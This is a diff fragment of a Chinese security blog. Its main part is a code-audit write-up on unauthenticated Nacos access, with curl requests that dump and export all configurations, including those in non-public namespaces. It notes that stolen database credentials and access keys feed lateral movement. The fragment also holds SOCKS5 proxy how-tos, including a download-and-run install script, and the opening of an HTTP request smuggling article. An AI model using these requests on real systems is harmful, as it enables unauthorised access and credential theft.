class="keyword">if</span> (StringUtils.isNotBlank(appName)) &#123;</span><br><span class="line">           configAdvanceInfo.put(<span class="string">&quot;appName&quot;</span>, appName);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">if</span> (StringUtils.isNotBlank(configTags)) &#123;</span><br><span class="line">           configAdvanceInfo.put(<span class="string">&quot;config_tags&quot;</span>, configTags);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="keyword">return</span> configInfoPersistService.findConfigInfo4Page(pageNo, pageSize, dataId, group, tenant, configAdvanceInfo);</span><br><span class="line">       &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">           <span class="type">String</span> <span class="variable">errorMsg</span> <span class="operator">=</span> <span class="string">&quot;serialize page error, dataId=&quot;</span> + dataId + <span class="string">&quot;, group=&quot;</span> + group;</span><br><span class="line">           LOGGER.error(errorMsg, e);</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(errorMsg, e);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * Fuzzy query configuration information. Fuzzy queries based only on content are not allowed, that is, both dataId</span></span><br><span class="line"><span class="comment">    * and group are NULL, but content is not NULL. In this case, all configurations are returned.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="meta">@GetMapping(params = &quot;search=blur&quot;)</span></span><br><span class="line">   <span class="meta">@Secured(action = ActionTypes.READ, signType = SignType.CONFIG)</span></span><br><span class="line">   <span class="keyword">public</span> Page&lt;ConfigInfo&gt; <span class="title function_">fuzzySearchConfig</span><span class="params">(<span class="meta">@RequestParam(&quot;dataId&quot;)</span> String dataId,</span></span><br><span class="line"><span class="params">           <span class="meta">@RequestParam(&quot;group&quot;)</span> String group, <span class="meta">@RequestParam(value = &quot;appName&quot;, required = false)</span> String appName,</span></span><br><span class="line"><span class="params">           <span class="meta">@RequestParam(value = &quot;tenant&quot;, required = false, defaultValue = StringUtils.EMPTY)</span> String tenant,</span></span><br><span class="line"><span class="params">           <span class="meta">@RequestParam(value = &quot;config_tags&quot;, required = false)</span> String configTags,</span></span><br><span class="line"><span class="params">           <span class="meta">@RequestParam(&quot;pageNo&quot;)</span> <span class="type">int</span> pageNo, <span class="meta">@RequestParam(&quot;pageSize&quot;)</span> <span class="type">int</span> pageSize)</span> &#123;</span><br><span class="line">       MetricsMonitor.getFuzzySearchMonitor().incrementAndGet();</span><br><span class="line">       Map&lt;String, Object&gt; configAdvanceInfo = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(<span class="number">50</span>);</span><br><span class="line">       <span class="keyword">if</span> (StringUtils.isNotBlank(appName)) &#123;</span><br><span class="line">           configAdvanceInfo.put(<span class="string">&quot;appName&quot;</span>, appName);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">if</span> (StringUtils.isNotBlank(configTags)) &#123;</span><br><span class="line">           configAdvanceInfo.put(<span class="string">&quot;config_tags&quot;</span>, configTags);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="keyword">return</span> configInfoPersistService.findConfigInfoLike4Page(pageNo, pageSize, dataId, group, tenant, configAdvanceInfo);</span><br><span class="line">       &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">           <span class="type">String</span> <span class="variable">errorMsg</span> <span class="operator">=</span> <span class="string">&quot;serialize page error, dataId=&quot;</span> + dataId + <span class="string">&quot;, group=&quot;</span> + group;</span><br><span class="line">           LOGGER.error(errorMsg, e);</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(errorMsg, e);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>我们可以看到首先先进行了<code>signType = SignType.CONFIG</code>的权限检查，这里的<code>signType</code>的一个作用就是检查<code>auth</code>是否开启，但是之前也提到过，<code>auth</code>是默认不开启的。接着我们继续分析，当参数<code>search=accurate</code>时，从GET请求中获取参数<code>dataId、group、appName、tenant、config_tags、pageNo、pageSize</code>参数，其中<code>appName、tenant、config_tags</code>不是必填的，接着先检查<code>appName</code>和<code>configTags</code>是否为空，我们直接留空或者不填就能绕过这个判断，然后接下来就是迷之操作了，直接给我全部返回了。<br>所以我们直接构造参数，就可以发现能够获取全部的配置文件了。</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X GET <span class="string">&#x27;http://192.168.20.144:8848/nacos/v1/cs/configs?search=accurate&amp;dataId=&amp;group=&amp;pageNo=1&amp;pageSize=99’</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>或者：</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X GET <span class="string">&#x27;http://192.168.20.144:8848/nacos/v1/cs/configs?search=blur&amp;dataId=&amp;group=&amp;pageNo=1&amp;pageSize=99’</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p><img src="/2023/07/24/Nacos-AccessToken/3.png" alt="image"></p>
-</blockquote>
-<blockquote>
-<p>但这里有个问题，这只能获取默认命名空间<code>public</code>里面的数据，但是现在有大聪明已经学会了不把数据放到默认的<code>public</code>，而是自己重新建一个<code>namespace</code>，再把企业的相关配置放在里面，这里留个伏笔，我们接着往下看。</p>
-</blockquote>
-<blockquote>
-<p><img src="/2023/07/24/Nacos-AccessToken/4.png" alt="image"></p>
-</blockquote>
-<h3><span id="获取其他namespace的配置数据">获取其他Namespace的配置数据</span></h3><blockquote>
-<p>根据官方的OpenAPI文档描述，可以直接请求获取。</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X GET <span class="string">&#x27;http://192.168.20.144:8848/nacos/v1/console/namespaces&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>我们查看对应的代码，处理<code>namespace</code>的代码在<code>nacos/console/src/main/java/com/alibaba/nacos/console/controller/NamespaceController.java</code>这里，我们看从48行开始的代码，相关代码如下：</p>
-</blockquote>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/v1/console/namespaces&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NamespaceController</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> CommonPersistService commonPersistService;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> NamespaceOperationService namespaceOperationService;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">Pattern</span> <span class="variable">namespaceIdCheckPattern</span> <span class="operator">=</span> Pattern.compile(<span class="string">&quot;^[\\w-]+&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">NAMESPACE_ID_MAX_LENGTH</span> <span class="operator">=</span> <span class="number">128</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Get namespace list.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> namespace list</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@GetMapping</span></span><br><span class="line">    <span class="keyword">public</span> RestResult&lt;List&lt;Namespace&gt;&gt; <span class="title function_">getNamespaces</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> RestResultUtils.success(namespaceOperationService.getNamespaceList());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>这样一看上去，直接访问就能获取到<code>Namespace</code>列表，我们再跟一下<code>namespaceOperationService.getNamespaceList()</code>:</p>
-</blockquote>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> List&lt;Namespace&gt; <span class="title function_">getNamespaceList</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// TODO 获取用kp</span></span><br><span class="line">        List&lt;TenantInfo&gt; tenantInfos = commonPersistService.findTenantByKp(DEFAULT_KP);</span><br><span class="line">        </span><br><span class="line">        <span class="type">Namespace</span> <span class="variable">namespace0</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Namespace</span>(<span class="string">&quot;&quot;</span>, DEFAULT_NAMESPACE, DEFAULT_QUOTA,</span><br><span class="line">                configInfoPersistService.configInfoCount(DEFAULT_TENANT), NamespaceTypeEnum.GLOBAL.getType());</span><br><span class="line">        List&lt;Namespace&gt; namespaceList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        namespaceList.add(namespace0);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (TenantInfo tenantInfo : tenantInfos) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">configCount</span> <span class="operator">=</span> configInfoPersistService.configInfoCount(tenantInfo.getTenantId());</span><br><span class="line">            <span class="type">Namespace</span> <span class="variable">namespaceTmp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Namespace</span>(tenantInfo.getTenantId(), tenantInfo.getTenantName(),</span><br><span class="line">                    tenantInfo.getTenantDesc(), DEFAULT_QUOTA, configCount, NamespaceTypeEnum.CUSTOM.getType());</span><br><span class="line">            namespaceList.add(namespaceTmp);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> namespaceList;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>看上去也没有做什么限制，我们直接访问发现可以直接读到非public的Namespace，就是上面我们创建名叫REDTEAM的test_namespace命名空间。</p>
-</blockquote>
-<blockquote>
-<p><img src="/2023/07/24/Nacos-AccessToken/5.png" alt="image"></p>
-</blockquote>
-<blockquote>
-<p>这时候我们已经拿到了namespace、namespaceShowNmae，我们就可以根据之前的API光明正大的进行读取操作了，这里有个小技巧，之前读取配置里面的tenant参数获取的就是namespce，我们直接把tenant&#x3D;test_namespace加进去构造请求，轻松读取到非public空间的数据。</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X GET <span class="string">&#x27;http://192.168.20.144:8848/nacos/v1/cs/configs?search=accurate&amp;dataId=&amp;group=&amp;pageNo=1&amp;pageSize=99&amp;tenant=test_namespace&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p><img src="/2023/07/24/Nacos-AccessToken/6.png" alt="image"></p>
-</blockquote>
-<h3><span id="配置文件导出">配置文件导出</span></h3><blockquote>
-<p>就在我看上面上面这部分代码的时候，我们无意中发现了一个下载文件的接口，还是这个文件，找到了疑似导出配置文件的接口，我们继续跟进一下。<br><code>/config/src/main/java/com/alibaba/nacos/config/server/controller/ConfigController.java</code></p>
-</blockquote>
-<blockquote>
-<p><img src="/2023/07/24/Nacos-AccessToken/7.png" alt="image"></p>
-</blockquote>
-<blockquote>
-<p>接着我们在482行看到了相关代码。</p>
-</blockquote>
-<blockquote>
-<p><img src="/2023/07/24/Nacos-AccessToken/8.png" alt="image"></p>
-</blockquote>
-<blockquote>
-<p>根据逻辑，我们很轻松的构造出下载的链接，跟上面的类似，其中tenant为空默认下载public命名空间，如果要下载其他命名空间的配置文件则重复之前的先获取Namespace即可。</p>
-</blockquote>
-<blockquote>
-<p><code>http://192.168.20.144:8848/nacos/v1/cs/configs?export=true&amp;tenant=test_namespace&amp;group=&amp;appName=&amp;ids=</code></p>
-</blockquote>
-<h2><span id="后记">后记</span></h2><blockquote>
-<p>现在来看，之所以因为官方觉得不开启auth不算是漏洞，是因为根据官网OpenAPI来看，你需要知道具体的 Data Id 以及 Group才能读到具体配置，但是攻击者总能够通过代码审计的方法找到其他参数进行绕过。<br>目前攻防对抗实战中，Nacos的环境遇到非常多，并且无一例外都没有开启auth，很多防守方甚至只是用防火墙阻断网上公开的那几条exp利用的关键地址，Nacos里面保存了企业很多的配置文件比如数据库连接信息、AK&#x2F;SK信息等等，拿到账号密码等信息之后用来做密码本，然后再进行内网横向，杀伤力非常之大。</p>
-</blockquote>
-<h2><span id="参考链接">参考链接</span></h2><blockquote>
-<p><a target="_blank" rel="noopener" href="https://nacos.io/en-us/docs/auth.html">https://nacos.io/en-us/docs/auth.html</a><br><a target="_blank" rel="noopener" href="https://github.com/alibaba/nacos/issues/1105">https://github.com/alibaba/nacos/issues/1105</a></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Nacos/" rel="tag">Nacos</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2023/07/04/Curl-Socks5h-x/">
-                Curl-Socks5h-x
-            </a>
-        </h2>
-    
-    <time>
-        Jul 4, 2023
-    </time>
-    <section class="content">
-        <h1><span id="linux讓-curl-藉由-socks5-proxy-連線時不要反解-dns造成連線失敗">[Linux]讓 curl 藉由 socks5 proxy 連線時，不要反解 DNS，造成連線失敗</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="https://ephrain.net/linux-%e8%ae%93-curl-%e8%97%89%e7%94%b1-socks5-proxy-%e9%80%a3%e7%b7%9a%e6%99%82%ef%bc%8c%e4%b8%8d%e8%a6%81%e5%8f%8d%e8%a7%a3-dns%ef%bc%8c%e9%80%a0%e6%88%90%e9%80%a3%e7%b7%9a%e5%a4%b1%e6%95%97/">Ephrain</a> 并作补充</p>
-</blockquote>
-<h2><span id="proxy-server链接问题">Proxy Server链接问题</span></h2><blockquote>
-<p>公司的專案程式通常需要支援各種 proxy server，如 HTTP proxy, socks4 和 socks5 proxy。<br>今天遇到一個問題，我們的程式底層會使用 libcurl 做 HTTP 連線，但連到一台 socks5 proxy 時卻不能成功…</p>
-<p>試著用 curl 加上 -x 選項來指定 proxy server，再加 -v 選項看看詳細的錯誤訊息：</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">testuser@localhost ~ curl -v -x socks5://172.22.1.1:8080 https://testdomain.com</span><br><span class="line"></span><br><span class="line">* Rebuilt URL to: https://testdomain.com/</span><br><span class="line">*   Trying 172.22.1.1...</span><br><span class="line">* TCP_NODELAY <span class="built_in">set</span></span><br><span class="line">* SOCKS5 communication to testdomain.com:443</span><br><span class="line">* SOCKS5 connect to IPv6 2600:1417:1b:184::23ac (locally resolved)</span><br><span class="line">* Can<span class="string">&#x27;t complete SOCKS5 connection to 0.0.0.0:0. (1)</span></span><br><span class="line"><span class="string">* Closing connection 0</span></span><br><span class="line"><span class="string">curl: (7) Can&#x27;</span>t complete SOCKS5 connection to 0.0.0.0:0. (1)</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>可以看到訊息裡有一行 locally resolved，這行代表的是 curl 自行去查詢了 DNS，將 testdomain.com 的 IP 找出來，但因為 curl 使用的是 Happy Eyeball 的演算法，同時會發出 Type A 和 AAAA 的 DNS request 封包，因此如果 AAAA 的 DNS 回應封包先回來的話，就會拿到 testdomain.com 的對應 IPv6 位址，反之如果是 A 的 DNS 回應封包先回來的話，拿到的則是 IPv4 位址。</p>
-</blockquote>
-<blockquote>
-<p>下面用 Wireshark 觀察一下 curl 產生出來的 DNS 封包，它送出了 A 和 AAAA 兩種 DNS 封包，以下例來說是 A (IPv4) 的回應先回來，但這個結果會依據網路狀況而有所不同，有時候是 AAAA (IPv6) 的回應先回來：<br><img src="/2023/07/04/Curl-Socks5h-x/1.png" alt="image"></p>
-</blockquote>
-<blockquote>
-<p>curl 自行查詢 DNS 這件事情有什麼錯誤嗎？<br>以這個例子來說，curl 幫忙查出 testdomain.com 的 IPv6 位址 2600:1417:1b:184::23ac，然後連線到 socks5 proxy 172.22.1.1，叫它連線到這個 IPv6 位址去。<br>然而，這台 socks5 proxy 所在的網路只設定了 IPv4 位址，所以 proxy server 本身是無法藉由 IPv6 位址來連線的！<br>因此它自然無法連線到 curl 指定的 IPv6 位址，導致連線失敗…</p>
-</blockquote>
-<blockquote>
-<p>要解決這個問題，可以叫 curl 不要雞婆自己去查 DNS，而是讓 proxy server 自己來查 DNS，因為 proxy server 自己知道所處的網路環境，像是它不能連 IPv6 網路時，自然不會去問 Type AAAA (IPv6) 的 DNS 結果。</p>
-</blockquote>
-<blockquote>
-<p>我們將原本的 socks5:&#x2F;&#x2F;<proxy>:<port> 改成 socks5h:&#x2F;&#x2F;<proxy>:<port>，代表要讓 proxy 自己的查詢 DNS，可以看到 curl 直接連到了 proxy server，沒有先做 DNS 查詢，而最終 proxy 也成功完成了連線：</port></proxy></port></proxy></p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">testuser@localhost ~ curl -v -x socks5h://172.22.1.1:8080 https://testdomain.com</span><br><span class="line"></span><br><span class="line">* Rebuilt URL to: https://testdomain.com/</span><br><span class="line">*   Trying 172.22.1.1...</span><br><span class="line">* TCP_NODELAY <span class="built_in">set</span></span><br><span class="line">* SOCKS5 communication to testdomain.com:443</span><br><span class="line">* SOCKS5 request granted.</span><br><span class="line">* Connected to 172.22.1.1 (172.22.1.1) port 8080 (<span class="comment">#0)</span></span><br><span class="line">...</span><br><span class="line">* Curl_http_done: called premature == 0</span><br><span class="line">* Connection <span class="comment">#0 to host testdomain.com left intact</span></span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>不過這種雷，幾乎是每次整合一個用到 libcurl 的模組，就會再踩到一次啊…</p>
-</blockquote>
-<h2><span id="我遇到的场景">我遇到的场景</span></h2><blockquote>
-<p>首先，我没想到我会被台湾同胞的这篇技术博客教到很有趣的东西，其次，博主的语言和繁体配合起来更有趣了，也基于尊重保留了完整原文<br><img src="/2023/07/04/Curl-Socks5h-x/1.jpg" alt="image"></p>
-</blockquote>
-<blockquote>
-<p>公司做安全监控平台收敛内网后，外部主机关联内网服务器的数据，需要监控进程 agent 以走代理的方式进来<br>自然代理服务器的公网地址和内网地址不在一个网段，然后为了安全性，代理服务器内网地址虽然和监控服务器同一网段，但由于安全组的隔离两者是不能直接访问的……(<em>´◐∀◐&#96;</em>)</p>
-</blockquote>
-<blockquote>
-<p>代中代(<em>´◐∀◐&#96;</em>)</p>
-</blockquote>
-<blockquote>
-<p>很自然的 curl 即使走代理都找不到身处内网的监控服务器域名<br>我只能在代理服务器 host 上配一下域名解析，然后翻了许久找到了 curl 的代理访问方式原理，就是这位博主的文章，让我明白了可以让 Proxy Server 去做 curl 的进一步内网解析<br>泪目，乙方厂商技术整半天都解决不了的问题，后来和我说我给的命令，其他客户也有这种问题的不能装的也能装了，让我找他们销售要钱草w(“▔□▔)</p>
-</blockquote>
-<blockquote>
-<p>希望两岸互相少点偏见吧</p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Chaos/" rel="tag">Chaos</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/Socks5/" rel="tag">Socks5</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2023/06/27/Danted-Socks5-proxy/">
-                Danted Socks5代理搭建
-            </a>
-        </h2>
-    
-    <time>
-        Jun 27, 2023
-    </time>
-    <section class="content">
-        <h1><span id="danted-socks5代理搭建">Danted Socks5代理搭建</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="https://sunpma.com/724.html">SunPma</a> 并作补充</p>
-</blockquote>
-<h2><span id="说明">说明</span></h2><blockquote>
-<p>Socks5属于明文代理，不要用于科学上网，否则会被阻断端口，可用于正常的跳板使用；<br>比如SSH转发加速国外VPS的连接速度，特别是一些延迟高或者丢包高的VPS；<br>使用Socks5转发后SSH就可以快速稳定的连接了，解决高丢包SSH断开的问题；</p>
-</blockquote>
-<h2><span id="支持">支持</span></h2><blockquote>
-<p>支持系统：Debian7+ Ubuntu14.04+ CentOS6+</p>
-</blockquote>
-<h2><span id="安装">安装</span></h2><blockquote>
-<p>下载脚本：</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget --no-check-certificate https://raw.github.com/Lozy/danted/master/install.sh -O install.sh</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>安装脚本：</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash install.sh  --port=端口 --user=用户名 --passwd=密码</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>其中的端口 用户名 密码自行修改后粘贴到SSH里运行安装即可；<br>完成后会提示Dante Server Install Successfuly即表示安装成功；<br>安装后如果连接不上，检查设置的端口是否已经放行；<br>说明：安装完成后会显示内网IP地址，但在实际使用的时候需要用外网IP地址；</p>
-</blockquote>
-<h2><span id="使用">使用</span></h2><blockquote>
-<p>一般使用IP和用户名密码即可使用<br>如果需要固定IP或IP段，可以修改配置文件设置白名单</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/danted/sockd.conf</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>修改以下代码，改成你需要设置的白名单IP或IP段即可，然后重启使其生效；</p>
-</blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">client pass &#123;</span><br><span class="line">        from: 0.0.0.0/0  to: 0.0.0.0/0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2><span id="卸载">卸载</span></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash install.sh --uninstall</span><br></pre></td></tr></table></figure>
-
-<h2><span id="命令">命令</span></h2><p>|命令	|或者	|说明|<br>|service sockd start	|&#x2F;etc&#x2F;init.d&#x2F;sockd start	|启动socks5服务器守护进程|<br>|service sockd stop	|&#x2F;etc&#x2F;init.d&#x2F;sockd stop	|停止socks5服务器守护进程|<br>|service sockd restart	|&#x2F;etc&#x2F;init.d&#x2F;sockd restart	|重新启动socks5服务器守护进程|<br>|service sockd reload	|&#x2F;etc&#x2F;init.d&#x2F;sockd reload	|重新加载socks5服务器守护进程|<br>|service sockd status	|&#x2F;	|系统进程状态|<br>|service sockd state	|&#x2F;etc&#x2F;init.d&#x2F;sockd state	|运行状态|<br>|service sockd tail	|&#x2F;etc&#x2F;init.d&#x2F;sockd tail	sock |日志|<br>|service sockd adduser	|&#x2F;etc&#x2F;init.d&#x2F;sockd adduser	|添加pam-auth用户：service sockd adduser NAME PASSWORD|<br>|service sockd deluser	|&#x2F;etc&#x2F;init.d&#x2F;sockd deluser	|删除pam-auth用户：service sockd deluser NAME|</p>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Danted/" rel="tag">Danted</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/Socks5/" rel="tag">Socks5</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2023/06/27/HTTP-request-smuggling-vulnerability/">
-                HTTP请求走私漏洞
-            </a>
-        </h2>
-    
-    <time>
-        Jun 27, 2023
-    </time>
-    <section class="content">
-        <h1><span id="http请求走私漏洞">HTTP请求走私漏洞</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46150940/article/details/115311234">Atkxor</a> 并作补充</p>
+        <h1><span id="如何进行一次完整的-sslstrip-攻击">如何进行一次完整的 SSLStrip 攻击</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://glsakura.gitee.io/2020/04/02/%E5%A6%82%E4%BD%95%E8%BF%9B%E8%A1%8C%E4%B8%80%E6%AC%A1%E5%AE%8C%E6%95%B4%E7%9A%84%20SSLStrip%20%E6%94%BB%E5%87%BB/">Glsakura</a> 并作补充</p>
 </blockquote>
 <h2><span id="简介">简介</span></h2><blockquote>
-<p>HTTP请求走私是一种干扰网站处理从一个或多个用户接收的HTTP请求序列的方式的技术。请求走私漏洞本质上通常很关键，它使攻击者可以绕过安全控制，未经授权访问敏感数据并直接危害其他应用程序用户。</p>
-<ul>
-<li>利用Content-Length字段来判定请求体的内容长度</li>
-<li>利用Transfer-Encoding字段来判定请求体的结束位置</li>
-</ul>
-</blockquote>
-<h2><span id="基础知识">基础知识</span></h2><h3><span id="content-length">Content-Length</span></h3><blockquote>
-<p>Content-Length即为实体长度。浏览器可以通过 Content-Length 的长度信息，判断出响应实体已结束。通常如果 Content-Length 比实际长度短，会造成内容被截断；如果比实体内容长，会造成 pending。</p>
-</blockquote>
-<h3><span id="transfer-encoding">Transfer-Encoding</span></h3><blockquote>
-<p>历史上 Transfer-Encoding 可以有多种取值，但最新的 HTTP 规范里，只定义了一种传输编码：分块编码（chunked）。<br>分块编码相当简单，在头部加入 Transfer-Encoding: chunked 之后，就代表这个报文采用了分块编码。这时，报文中的实体需要改为用一系列分块来传输。每个分块包含十六进制的长度值和数据，长度值独占一行，长度不包括它结尾的 CRLF（\r\n），也不包括分块数据结尾的 CRLF。最后一个分块长度值必须为 0，对应的分块数据没有内容，表示实体结束。</p>
-</blockquote>
-<h3><span id="cl与te解析优先级顺序">CL与TE解析优先级顺序</span></h3><blockquote>
-<p>CL表示Content-Length，TE表示Transfer-Encoding。优先级顺序详见 <a target="_blank" rel="noopener" href="https://datatracker.ietf.org/doc/html/rfc7230#section-3.3.3">RFC7230 section 3.3.3</a></p>
-</blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">If a message is received with both a Transfer-Encoding and a</span><br><span class="line">Content-Length header field, the Transfer-Encoding overrides the</span><br><span class="line">Content-Length. Such a message might indicate an attempt to perform</span><br><span class="line">request smuggling (Section 9.5) or response splitting (Section 9.4)</span><br><span class="line">and ought to be handled as an error. A sender MUST remove the received Content-Length field prior to forwarding such a message downstream.</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>TE 优先于 CL ，但可以通过一些方式绕过</p>
-</blockquote>
-<h2><span id="请求走私分类">请求走私分类</span></h2><blockquote>
-<p>请求走私攻击包括将Content-Length标头和Transfer-Encoding 标头都放入单个HTTP请求中并进行处理，以便前端服务器和后端服务器以不同的方式处理请求。完成此操作的确切方式取决于两个服务器的行为：</p>
-<ul>
-<li>CL不为0:前端代理服务器允许请求携带请求体，而后端服务器不允许请求携带请求体。</li>
-<li>CL-CL：前端服务器使用Transfer-Encoding头，而后端服务器使用Content-Length头。</li>
-<li>CL-TE：前端服务器使用Content-Length标头，而后端服务器使用Transfer- Encoding标头。</li>
-<li>TE-TE：前端服务器和后端服务器都支持Transfer-Encoding标头，但是可以通过某种方式混淆标头来诱导其中一台服务器不对其进行处理。</li>
-<li>TE-CL：前端服务器使用Transfer-Encoding头，而后端服务器使用Content-Length头。</li>
-</ul>
-</blockquote>
-<h3><span id="cl不为0">CL不为0</span></h3><blockquote>
-<p>所有不携带请求体的HTTP请求都有可能受此影响,这里以GET请求为例。<br>当前端服务器允许GET请求携带请求体，而后端服务器不允许GET请求携带请求体，它会直接忽略掉GET请求中的Content-Length头，不进行处理。这就有可能导致请求走私。<br>比如构造请求：</p>
-</blockquote>
